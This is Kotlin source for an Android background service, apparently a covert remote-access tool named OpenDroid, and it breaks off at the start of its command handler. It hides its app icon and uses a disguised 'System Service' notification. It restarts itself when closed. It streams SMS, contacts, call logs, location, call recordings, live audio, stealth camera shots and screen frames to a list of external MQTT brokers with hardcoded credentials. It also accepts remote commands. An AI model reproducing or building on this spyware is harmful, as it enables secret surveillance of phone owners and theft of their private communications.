package com.example.localutility

import android.app.AlarmManager
import android.app.Notification
import android.app.PendingIntent
import android.os.SystemClock
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.Ringtone
import android.media.RingtoneManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import io.ktor.http.ContentType
import io.ktor.http.content.PartData
import io.ktor.http.content.forEachPart
import io.ktor.http.content.streamProvider
import io.ktor.server.application.*
import io.ktor.server.cio.CIO
import io.ktor.server.engine.ApplicationEngine
import io.ktor.server.engine.embeddedServer
import io.ktor.server.request.receiveMultipart
import io.ktor.server.request.receiveText
import io.ktor.server.response.*
import io.ktor.http.HttpStatusCode
import io.ktor.server.routing.*
import io.ktor.server.websocket.*
import io.ktor.websocket.Frame
import io.ktor.websocket.readText
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import org.eclipse.paho.client.mqttv3.*
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import javax.net.ssl.SSLSocketFactory

class LocalFileServerService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var server: ApplicationEngine? = null
    private var isServerStartingOrRunning = false
    private lateinit var baseDir: File
    private var currentRingtone: Ringtone? = null
    private val wsMessageChannel = Channel<String>(Channel.UNLIMITED)
    private val mqttSendChannel = Channel<String>(Channel.UNLIMITED)
    private var mqttClient: MqttClient? = null
    private lateinit var teleManager: TelephonyAndLocationManager
    private var wakeLock: PowerManager.WakeLock? = null
    private var isStandaloneTorchOn: Boolean = false
    private lateinit var stealthCaptureManager: StealthCaptureManager

    companion object {
        private const val PORT = 8888
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "FileServerChannel"
        var currentPairingCode: String = "123456"
        var isCloudConnected: Boolean = false
        var onCloudStatusChanged: ((Boolean) -> Unit)? = null
        var instance: LocalFileServerService? = null

        // Phase 6 & 7: Account & Multi-Device Global State with Secret PIN
        var boundAccountEmail: String = ""
        var boundAccountPin: String = ""
        var accountTag: String = ""
        var openDroidDeviceId: String = ""
        var persistentHardwareId: String = ""
        var deviceNickname: String = ""
    }

    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            broadcastBatteryStatus()
        }
    }

    private var smsObserver: android.database.ContentObserver? = null

    private fun registerSmsObserver() {
        try {
            smsObserver = object : android.database.ContentObserver(android.os.Handler(android.os.Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    serviceScope.launch(Dispatchers.IO) {
                        try {
                            val latestThreads = teleManager.getSmsThreadsPaged(0, 10)
                            broadcastMessage(JSONObject().apply {
                                put("type", "SMS_THREADS_UPDATED")
                                put("data", latestThreads.getJSONArray("threads"))
                            }.toString())
                        } catch (_: Exception) {}
                    }
                }
            }
            contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver!!)
        } catch (_: Exception) {}
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
        currentPairingCode = prefs.getString("pairing_code", currentPairingCode) ?: currentPairingCode

        // Phase 10: Wire WebRtcManager outgoing signaling callback
        WebRtcManager.getInstance(applicationContext).onSendMessage = { messageJson ->
            try {
                broadcastMessage(JSONObject().apply {
                    put("type", "WEBRTC_SIGNAL")
                    put("data", JSONObject(messageJson))
                }.toString())
            } catch (_: Exception) {}
        }

        // Phase 7: Deterministic permanent hardware-backed Device ID (never duplicates across reinstalls/rebinds)
        val androidId = try {
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
        } catch (e: Exception) { "" }

        val cleanHardwareId = if (androidId.isNotEmpty() && androidId != "9774d56d682e549c") {
            androidId.lowercase()
        } else {
            val raw = "${Build.MANUFACTURER}_${Build.MODEL}_${Build.BOARD}"
            java.security.MessageDigest.getInstance("MD5").digest(raw.toByteArray())
                .joinToString("") { "%02x".format(it) }
        }
        persistentHardwareId = cleanHardwareId
        openDroidDeviceId = "dev_" + cleanHardwareId.takeLast(10)
        prefs.edit().putString("device_id", openDroidDeviceId).apply()
        val savedEmail = prefs.getString("account_email", "") ?: ""
        val savedPin = prefs.getString("account_pin", "") ?: ""
        val savedName = prefs.getString("device_name", Build.MODEL) ?: (Build.MODEL ?: "Android Device")
        if (savedEmail.isNotEmpty() && savedPin.isNotEmpty()) {
            bindAccountInternal(savedEmail, savedPin, savedName)
        }

        baseDir = getExternalFilesDir(null) ?: filesDir
        createNotificationChannel()
        registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        registerSmsObserver()

        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "OpenDroid::5GKeepAliveWakeLock").apply {
                setReferenceCounted(false)
                acquire()
            }
            Log.d("KeepAlive", "Partial WakeLock acquired successfully")
        } catch (e: Exception) {
            Log.e("KeepAlive", "Error acquiring WakeLock", e)
        }

        teleManager = TelephonyAndLocationManager(applicationContext)
        teleManager.onLocationUpdated = { locJson ->
            broadcastMessage(locJson.toString())
        }

                stealthCaptureManager = StealthCaptureManager(applicationContext)

        val callRecorder = CallRecordingManager.getInstance(applicationContext)
        callRecorder.onCallStateChanged = { state, number ->
            broadcastMessage(JSONObject().apply {
                put("type", "CALL_STATE")
                put("state", state)
                put("number", number)
            }.toString())
        }
        callRecorder.onCallRecordingCompleted = { fileName, durationMs, number ->
            broadcastMessage(JSONObject().apply {
                put("type", "CALL_RECORDING_SAVED")
                put("fileName", fileName)
                put("durationMs", durationMs)
                put("number", number)
            }.toString())
            broadcastCallRecordingsList()
        }
        callRecorder.onLiveAudioChunk = { base64Pcm ->
            sendDirectAudioChunk(base64Pcm)
        }

        startMqttWorker()
        initCloudBridge()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.getStringExtra("PAIRING_CODE")?.let {
            if (it.isNotEmpty()) {
                currentPairingCode = it
                if (mqttClient?.isConnected == true) {
                    subscribeToCode(it)
                }
            }
        }
        startForegroundService()
        startServer()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d("OpenDroid", "Task swiped from recents - scheduling foreground service restart")
        try {
            val restartIntent = Intent(applicationContext, LocalFileServerService::class.java).apply {
                setPackage(packageName)
                putExtra("PAIRING_CODE", currentPairingCode)
            }
            val restartPendingIntent = PendingIntent.getService(
                applicationContext,
                1,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmService = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
            alarmService?.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartPendingIntent
            )
        } catch (e: Exception) {
            Log.e("OpenDroid", "Error in onTaskRemoved restart", e)
        }
    }

    private fun startForegroundService() {
        try {
            // Stealth & Disguised notification: No pairing code or OpenDroid branding shown
            val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Background sync running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setShowWhen(false)
                .build()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            Log.d("OpenDroid", "Foreground service started in silent stealth mode")
        } catch (e: Exception) {
            Log.e("OpenDroid", "Error in startForeground (Notification disabled by user)", e)
            // Even if notification permission is revoked or disabled, keep background threads and MQTT alive
        }
    }

    private fun startMqttWorker() {
        serviceScope.launch {
            for (msg in mqttSendChannel) {
                try {
                    if (mqttClient?.isConnected == true) {
                        val mqttMsg = MqttMessage(msg.toByteArray()).apply { qos = 1 }
                        // Always publish to guest pairing code channel
                        mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)

                        // If bound to account, also publish to multi-device account channel
                        if (accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
                            mqttClient?.publish("opendroid/acc/$accountTag/$openDroidDeviceId/pc", mqttMsg)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("CloudBridge", "MQTT Publish Error", e)
                }
            }
        }
    }

        // --- 7-Server Multi-Broker Cascade Pool (Resilient Auto-Failover) ---
    private val EMQX_BROKERS = listOf(
        "ssl://mfca5de2.ala.asia-southeast1.emqxsl.com:8883", // Server 1 (Primary Active - Asia)
        "ssl://f9a916bf.ala.asia-southeast1.emqxsl.com:8883", // Server 2 (Backup A)
        "ssl://zf2cebac.ala.asia-southeast1.emqxsl.com:8883", // Server 3 (Backup B)
        "ssl://w21b112c.ala.asia-southeast1.emqxsl.com:8883", // Server 4 (Backup C)
        "ssl://e62c118f.ala.asia-southeast1.emqxsl.com:8883", // Server 5 (Backup D)
        "ssl://w501fd1f.ala.asia-southeast1.emqxsl.com:8883", // Server 6 (Backup E)
        "ssl://broker.emqx.io:8883",                         // Public Lifeline
        "ssl://ceee508c.ala.asia-southeast1.emqxsl.com:8883"  // Exhausted Cluster Backup
    )
    @Volatile
    private var activeBrokerIndex = 0
    @Volatile
    private var brokerRetryCount = 0

    private fun initCloudBridge(brokerIdx: Int = 0) {
        serviceScope.launch {
            val targetIdx = if (brokerIdx == 0) {
                try {
                    val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
                    prefs.getInt("active_broker_index", 0)
                } catch (_: Exception) { 0 }
            } else {
                brokerIdx
            }
            val safeIdx = targetIdx % EMQX_BROKERS.size
            activeBrokerIndex = safeIdx
            val brokerUrl = EMQX_BROKERS[safeIdx]
            try {
                Log.d("CloudBridge", "Attempting connection to Broker [$safeIdx]: $brokerUrl")
                val clientId = "OpenDroidPhone_" + System.currentTimeMillis()

                try {
                    mqttClient?.disconnectForcibly(1000, 1000)
                    mqttClient?.close()
                } catch (e: Exception) {}

                mqttClient = MqttClient(brokerUrl, clientId, MemoryPersistence())

                val options = MqttConnectOptions().apply {
                    if (!brokerUrl.contains("broker.emqx.io")) {
                        userName = "OpenDroid-v1"
                        password = "OpenDroid-v1@kakaxi69".toCharArray()
                    }
                    socketFactory = SSLSocketFactory.getDefault()
                    isCleanSession = true
                    connectionTimeout = 15
                    keepAliveInterval = 25
                    isAutomaticReconnect = false
                }
                if (accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
                    try {
                        val willTopic = "opendroid/acc/$accountTag/devices/$openDroidDeviceId/presence"
                        val willJson = JSONObject().apply {
                            put("deviceId", openDroidDeviceId)
                            put("hardwareId", persistentHardwareId.ifEmpty { openDroidDeviceId })
                            put("deviceName", deviceNickname)
                            put("model", Build.MODEL ?: "Android Device")
                            put("manufacturer", Build.MANUFACTURER ?: "Android")
                            put("isOnline", false)
                            put("timestamp", System.currentTimeMillis())
                        }
                        options.setWill(willTopic, willJson.toString().toByteArray(), 1, true)
                    } catch (e: Exception) {}
                }

                mqttClient?.setCallback(object : MqttCallbackExtended {
                    override fun connectComplete(reconnect: Boolean, serverURI: String?) {
                        Log.d("CloudBridge", "Connected to Broker [$activeBrokerIndex]: $serverURI")
                        isCloudConnected = true
                        brokerRetryCount = 0
                        try {
                            val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
                            prefs.edit().putInt("active_broker_index", activeBrokerIndex).apply()
                        } catch (_: Exception) {}
                        serviceScope.launch(Dispatchers.Main) {
                            onCloudStatusChanged?.invoke(true)
                        }
                        subscribeToCode(currentPairingCode)
                        subscribeToAccountChannels()
                        startPresenceHeartbeat()
                    }

                    override fun connectionLost(cause: Throwable?) {
                        Log.w("CloudBridge", "Connection lost on [$activeBrokerIndex] $brokerUrl. Reason: " + (cause?.message ?: "unknown"))
                        isCloudConnected = false
                        serviceScope.launch(Dispatchers.Main) {
                            onCloudStatusChanged?.invoke(false)
                        }
                        serviceScope.launch {
                            kotlinx.coroutines.delay(1500)
                            if (brokerRetryCount < 3) {
                                brokerRetryCount++
                                Log.d("CloudBridge", "Retrying active broker [$activeBrokerIndex] (Attempt $brokerRetryCount/3)...")
                                initCloudBridge(activeBrokerIndex)
                            } else {
                                brokerRetryCount = 0
                                Log.w("CloudBridge", "Broker [$activeBrokerIndex] quota or connection failed after 3 retries. Cascading to next broker...")
                                initCloudBridge(activeBrokerIndex + 1)
                            }
                        }
                    }

                    override fun messageArrived(topic: String?, message: MqttMessage?) {
                        if (topic != null && topic.endsWith("/discover")) {
                            Log.d("OpenDroid", "Discovery ping received on topic $topic! Responding with presence...")
                            publishDevicePresence(true)
                            return
                        }
                        message?.let {
                            val text = String(it.payload)
                            serviceScope.launch(Dispatchers.IO) {
                                try {
                                    handleIncomingJson(JSONObject(text))
                                } catch (e: Exception) {
                                    Log.e("CloudBridge", "Error handling incoming json", e)
                                }
                            }
                        }
                    }

                    override fun deliveryComplete(token: IMqttDeliveryToken?) {}
                })

                mqttClient?.connect(options)
                if (mqttClient?.isConnected == true) {
                    isCloudConnected = true
                    serviceScope.launch(Dispatchers.Main) {
                        onCloudStatusChanged?.invoke(true)
                    }
                    subscribeToCode(currentPairingCode)
                    subscribeToAccountChannels()
                    startPresenceHeartbeat()
                    Log.d("CloudBridge", "Successfully connected and active on Broker [$activeBrokerIndex]: $brokerUrl")
                }
            } catch (e: Exception) {
                Log.e("CloudBridge", "Failed to connect to Broker [$safeIdx]: $brokerUrl. Reason: " + (e.message ?: "unknown"), e)
                isCloudConnected = false
                serviceScope.launch(Dispatchers.Main) {
                    onCloudStatusChanged?.invoke(false)
                }
                serviceScope.launch {
                    kotlinx.coroutines.delay(2000)
                    if (brokerRetryCount < 3) {
                        brokerRetryCount++
                        initCloudBridge(safeIdx)
                    } else {
                        brokerRetryCount = 0
                        initCloudBridge(safeIdx + 1)
                    }
                }
            }
        }
    }

    private fun subscribeToCode(code: String) {
        try {
            mqttClient?.subscribe("opendroid/$code/phone", 1)
            sendFullSyncData()
        } catch (e: Exception) {
            Log.e("CloudBridge", "Subscribe error", e)
        }
    }

    // --- Phase 6: Central Account & Multi-Device Hub Engine ---
    fun bindAccount(email: String, pin: String, name: String) {
        bindAccountInternal(email, pin, name)
        subscribeToAccountChannels()
        startPresenceHeartbeat()
        publishDevicePresence(true)
        if (mqttClient?.isConnected != true) {
            initCloudBridge(0)
        } else {
            // Also ensure active broker is reset to primary Server 0 on explicit bind
            serviceScope.launch {
                delay(200)
                publishDevicePresence(true)
            }
        }
    }

    fun unbindAccount() {
        publishDevicePresence(false)
        try {
            if (accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
                mqttClient?.unsubscribe("opendroid/acc/$accountTag/$openDroidDeviceId/phone")
                mqttClient?.unsubscribe("opendroid/acc/$accountTag/discover")
            }
        } catch (e: Exception) {}
        boundAccountEmail = ""
        boundAccountPin = ""
        accountTag = ""
        deviceNickname = ""
    }

    private fun bindAccountInternal(email: String, pin: String, name: String) {
        boundAccountEmail = email.trim().lowercase()
        boundAccountPin = pin.trim()
        deviceNickname = if (name.trim().isEmpty()) (Build.MODEL ?: "Android Device") else name.trim()

        // Cryptographic SHA-256 salted accountTag derived from email + secret PIN
        val rawAuth = "$boundAccountEmail:$boundAccountPin"
        val hash = java.security.MessageDigest.getInstance("SHA-256")
            .digest(rawAuth.toByteArray())
            .joinToString("") { "%02x".format(it) }
        accountTag = "acc_" + hash.take(16)
        Log.d("OpenDroid", "Bound account: $boundAccountEmail [PIN Protected] -> Tag: $accountTag | Device: $openDroidDeviceId ($deviceNickname)")
    }

    private fun subscribeToAccountChannels() {
        if (mqttClient?.isConnected == true && accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
            try {
                mqttClient?.subscribe("opendroid/acc/$accountTag/$openDroidDeviceId/phone", 1)
                mqttClient?.subscribe("opendroid/acc/$accountTag/discover", 1)
                Log.d("OpenDroid", "Subscribed to account channels: $accountTag")
                publishDevicePresence(true)
            } catch (e: Exception) {
                Log.e("OpenDroid", "Failed to subscribe to account channels", e)
            }
        }
    }


    // --- Phase 16: Live Hardware Telemetry Streaming Engine ---
    private var telemetryStreamJob: kotlinx.coroutines.Job? = null

    private fun startHardwareTelemetryStream() {
        telemetryStreamJob?.cancel()
        telemetryStreamJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    val telemetryData = teleManager.getHardwareTelemetry()
                    val response = JSONObject().apply {
                        put("type", "HARDWARE_TELEMETRY_RESULT")
                        put("data", telemetryData)
                        put("timestamp", System.currentTimeMillis())
                    }
                    broadcastMessage(response.toString())
                } catch (e: Exception) {
                    Log.e("OpenDroid", "Telemetry streaming error", e)
                }
                kotlinx.coroutines.delay(3000L) // 3-second live refresh interval
            }
        }
    }

    private fun stopHardwareTelemetryStream() {
        telemetryStreamJob?.cancel()
        telemetryStreamJob = null
    }

    private var heartbeatJob: kotlinx.coroutines.Job? = null

    private fun startPresenceHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                if (isCloudConnected && accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
                    publishDevicePresence(true)
                }
                delay(25000L) // 25-second mobile 5G NAT heartbeat
            }
        }
    }

    private fun getNetworkTelemetry(): Triple<String, String, String> {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
            var netType = "Unknown"
            var wifiSsid = ""
            var ipAddress = ""

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val activeNet = cm?.activeNetwork
                val caps = cm?.getNetworkCapabilities(activeNet)
                if (caps != null) {
                    when {
                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> {
                            netType = "Wi-Fi"
                            try {
                                val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
                                val info = wm?.connectionInfo
                                val ssid = info?.ssid?.trim('"') ?: ""
                                if (ssid.isNotEmpty() && ssid != "<unknown ssid>") {
                                    wifiSsid = ssid
                                }
                            } catch (e: Exception) {}
                        }
                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                            netType = "Cellular (5G/LTE)"
                        }
                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> {
                            netType = "Ethernet"
                        }
                        else -> netType = "Connected"
                    }
                } else {
                    netType = "Offline"
                }
            }

            try {
                val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
                while (interfaces.hasMoreElements()) {
                    val networkInterface = interfaces.nextElement()
                    val addresses = networkInterface.inetAddresses
                    while (addresses.hasMoreElements()) {
                        val inetAddress = addresses.nextElement()
                        if (!inetAddress.isLoopbackAddress && inetAddress is java.net.Inet4Address) {
                            ipAddress = inetAddress.hostAddress ?: ""
                            break
                        }
                    }
                    if (ipAddress.isNotEmpty()) break
                }
            } catch (e: Exception) {}

            Triple(netType, wifiSsid, ipAddress)
        } catch (e: Exception) {
            Triple("Unknown", "", "")
        }
    }

    private fun publishDevicePresence(isOnline: Boolean) {
        if (mqttClient?.isConnected != true || accountTag.isEmpty() || openDroidDeviceId.isEmpty()) return
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val batteryLevel = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 50
            val isCharging = bm?.isCharging ?: false
            val (netType, wifiSsid, ipAddress) = getNetworkTelemetry()

            val presenceJson = JSONObject().apply {
                put("deviceId", openDroidDeviceId)
                put("hardwareId", persistentHardwareId.ifEmpty { openDroidDeviceId })
                put("deviceName", deviceNickname)
                put("model", Build.MODEL ?: "Android Device")
                put("manufacturer", Build.MANUFACTURER ?: "Android")
                put("osVersion", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                put("battery", batteryLevel)
                put("isCharging", isCharging)
                put("isOnline", isOnline)
                put("networkType", netType)
                put("wifiSsid", wifiSsid)
                put("ipAddress", ipAddress)
                put("activeServerIndex", activeBrokerIndex)
                put("timestamp", System.currentTimeMillis())
            }

            val topic = "opendroid/acc/$accountTag/devices/$openDroidDeviceId/presence"
            val msg = MqttMessage(presenceJson.toString().toByteArray()).apply {
                qos = 1
                isRetained = true // Retained message so web client gets latest state immediately
            }
            mqttClient?.publish(topic, msg)
            Log.d("OpenDroid", "Published presence heartbeat for $openDroidDeviceId (online=$isOnline, net=$netType, ip=$ipAddress)")
        } catch (e: Exception) {
            Log.e("OpenDroid", "Error publishing presence", e)
        }
    }

    private fun sendFullSyncData() {
        broadcastMessage(JSONObject().apply {
            put("type", "HANDSHAKE_ACK")
            put("code", currentPairingCode)
            put("device", Build.MODEL)
        }.toString())
        broadcastBatteryStatus()
        try {
            broadcastMessage(teleManager.getLocation().toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            broadcastMessage(JSONObject().put("type", "SMS_LIST").put("data", teleManager.getRecentSms()).toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            val initialThreads = teleManager.getSmsThreadsPaged(0, 25)
            broadcastMessage(JSONObject().apply {
                put("type", "SMS_THREADS_RESULT")
                put("data", initialThreads.getJSONArray("threads"))
                put("offset", initialThreads.getInt("offset"))
                put("limit", initialThreads.getInt("limit"))
                put("total", initialThreads.getInt("total"))
                put("hasMore", initialThreads.getBoolean("hasMore"))
            }.toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            val contactsPaged = teleManager.getContactsPaged(0, 100)
            broadcastMessage(JSONObject().apply {
                put("type", "CONTACTS_LIST")
                put("data", contactsPaged.getJSONArray("data"))
                put("offset", contactsPaged.getInt("offset"))
                put("limit", contactsPaged.getInt("limit"))
                put("total", contactsPaged.getInt("total"))
                put("hasMore", contactsPaged.getBoolean("hasMore"))
            }.toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            broadcastMessage(JSONObject().put("type", "STORAGE_STATS").put("data", teleManager.getStorageStats()).toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            val callLogsPaged = teleManager.getCallLogsPaged(0, 100)
            broadcastMessage(JSONObject().apply {
                put("type", "CALL_LOGS_LIST")
                put("data", callLogsPaged.getJSONArray("data"))
                put("offset", callLogsPaged.getInt("offset"))
                put("limit", callLogsPaged.getInt("limit"))
                put("total", callLogsPaged.getInt("total"))
                put("hasMore", callLogsPaged.getBoolean("hasMore"))
            }.toString())
            broadcastMessage(JSONObject().put("type", "STEALTH_MODE_STATUS").put("hideIcon", isStealthModeActive()).toString())
            broadcastCallRecordingsList()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun broadcastBatteryStatus() {
        try {
            val batteryStatus: Intent? = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val isCharging = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING
            if (level != -1 && scale != -1) {
                val pct = (level * 100 / scale.toFloat()).toInt()
                val rawTemp = batteryStatus?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
                val tempC = if (rawTemp > 0) rawTemp / 10.0 else 0.0
                val voltage = batteryStatus?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
                val healthCode = batteryStatus?.getIntExtra(BatteryManager.EXTRA_HEALTH, BatteryManager.BATTERY_HEALTH_UNKNOWN) ?: BatteryManager.BATTERY_HEALTH_UNKNOWN
                val healthStr = when (healthCode) {
                    BatteryManager.BATTERY_HEALTH_GOOD -> "Good"
                    BatteryManager.BATTERY_HEALTH_OVERHEAT -> "Overheat"
                    BatteryManager.BATTERY_HEALTH_DEAD -> "Dead"
                    BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "Over Voltage"
                    else -> "Normal"
                }
                val pluggedCode = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0
                val pluggedStr = when (pluggedCode) {
                    BatteryManager.BATTERY_PLUGGED_AC -> "AC Charger"
                    BatteryManager.BATTERY_PLUGGED_USB -> "USB Port"
                    BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
                    else -> "Unplugged"
                }
                val json = JSONObject().apply {
                    put("type", "BATTERY")
                    put("percent", pct)
                    put("charging", isCharging)
                    put("temperature", tempC)
                    put("voltage", voltage)
                    put("health", healthStr)
                    put("plugged", pluggedStr)
                }
                broadcastMessage(json.toString())
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun broadcastMessage(msg: String) {
        wsMessageChannel.trySend(msg)
        mqttSendChannel.trySend(msg)
    }

    private fun sendStealthCaptureResult(target: String, base64Data: String?, error: String?) {
        val response = JSONObject().apply {
            put("type", "STEALTH_CAPTURE_RESULT")
            put("target", target)
            put("success", error == null && base64Data != null)
            if (base64Data != null) put("data", base64Data)
            if (error != null) put("error", error)
        }
        val jsonStr = response.toString()

        // 1. Send to local WebSocket clients
        wsMessageChannel.trySend(jsonStr)

        // 2. Direct send to Cloud MQTT with QoS 0 (avoids Paho QoS 1 buffer overflow on large image payloads)
        serviceScope.launch(Dispatchers.IO) {
            try {
                if (mqttClient?.isConnected == true) {
                    val mqttMsg = MqttMessage(jsonStr.toByteArray()).apply { qos = 0 }
                    mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
                    if (accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
                        mqttClient?.publish("opendroid/acc/$accountTag/$openDroidDeviceId/pc", mqttMsg)
                    }
                    Log.d("StealthCapture", "Dispatched $target capture result via MQTT (qos 0)")
                }
            } catch (e: Exception) {
                Log.e("StealthCapture", "Error publishing stealth capture result", e)
            }
        }
    }

    fun setStealthMode(hideIcon: Boolean): Boolean {
        return try {
            val pm = packageManager
            val aliasComponent = ComponentName(applicationContext, "com.example.localutility.MainActivityAlias")
            val newState = if (hideIcon) {
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } else {
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            }
            pm.setComponentEnabledSetting(aliasComponent, newState, android.content.pm.PackageManager.DONT_KILL_APP)
            Log.d("OpenDroid", "Stealth mode updated: hideIcon=$hideIcon")
            true
        } catch (e: Exception) {
            Log.e("OpenDroid", "Failed to update stealth mode", e)
            false
        }
    }

    fun isStealthModeActive(): Boolean {
        return try {
            val pm = packageManager
            val aliasComponent = ComponentName(applicationContext, "com.example.localutility.MainActivityAlias")
            val state = pm.getComponentEnabledSetting(aliasComponent)
            state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            false
        }
    }

    fun sendDirectCameraFrame(base64Frame: String) {
        val json = JSONObject().apply {
            put("type", "CAMERA_FRAME")
            put("frame", base64Frame)
        }.toString()

        wsMessageChannel.trySend(json)
        if (mqttClient?.isConnected == true) {
            try {
                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
                if (accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
                    mqttClient?.publish("opendroid/acc/$accountTag/$openDroidDeviceId/pc", mqttMsg)
                }
            } catch (e: Exception) {
                Log.e("DirectCamera", "Frame publish error", e)
            }
        }
    }

    fun sendDirectScreenFrame(base64Frame: String) {
        val json = JSONObject().apply {
            put("type", "SCREEN_FRAME")
            put("frame", base64Frame)
        }.toString()

        wsMessageChannel.trySend(json)
        if (mqttClient?.isConnected == true) {
            try {
                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
                if (accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
                    mqttClient?.publish("opendroid/acc/$accountTag/$openDroidDeviceId/pc", mqttMsg)
                }
            } catch (e: Exception) {
                Log.e("DirectScreen", "Screen frame publish error", e)
            }
        }
    }

    fun sendDirectAudioChunk(base64Pcm: String) {
        val json = JSONObject().apply {
            put("type", "AUDIO_CHUNK")
            put("data", base64Pcm)
        }.toString()

        wsMessageChannel.trySend(json)
        if (mqttClient?.isConnected == true) {
            try {
                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
                if (accountTag.isNotEmpty() && openDroidDeviceId.isNotEmpty()) {
                    mqttClient?.publish("opendroid/acc/$accountTag/$openDroidDeviceId/pc", mqttMsg)
                }
            } catch (e: Exception) {
                Log.e("AudioStream", "Audio publish error", e)
            }
        }
    }

    private fun handleIncomingJson(json: JSONObject) {
        val cameraStreamer = DirectCameraStreamer.getInstance(applicationContext)
        val screenStreamer = DirectScreenStreamer.getInstance(applicationContext)
